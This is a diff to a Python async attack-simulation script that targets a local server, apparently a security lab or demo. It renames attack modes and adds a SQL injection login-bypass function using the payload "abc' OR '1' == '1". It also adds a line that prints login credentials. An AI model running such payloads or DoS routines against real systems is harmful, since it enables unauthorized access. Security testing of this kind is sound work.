@@ -13,8 +13,8 @@ import asyncio
 import sys
 
 attack_choices = [
-    'ddos',
-    'code_injection',
+    'dos',
+    'sql_injection',
     'secret_leak',
     'ssrf',
 ]
@@ -54,6 +54,7 @@ class AsyncHttpClient:
         try:
             login_url = 'http://localhost:5000/login'
             login_data = {'username': username, 'password': password}
+            print(login_data)
             response = await self.session.post(login_url, data=login_data)
             if response.status == 200:
                 print("Login successful")
@@ -174,7 +175,22 @@ async def dos_attack(username, password):
 
     await client.close_session()
 
+async def sql_injection_attack():
+    base_url = "http://localhost:5000"  # Replace with your server URL
+
+    client = AsyncHttpClient()
+
+    # Appending malicious SQL query to username
+    sql_attack_string = "abc' OR '1' == '1"
+
+    await client.login(sql_attack_string, "noop")
+
+    await client.close_session()
+
 print("Starting Attack --> ", args.attack)
 
-if args.attack == 'ddos':
+if args.attack == 'dos':
     asyncio.run(dos_attack(args.username, args.password))
+
+if args.attack == 'sql_injection':
+    asyncio.run(sql_injection_attack())
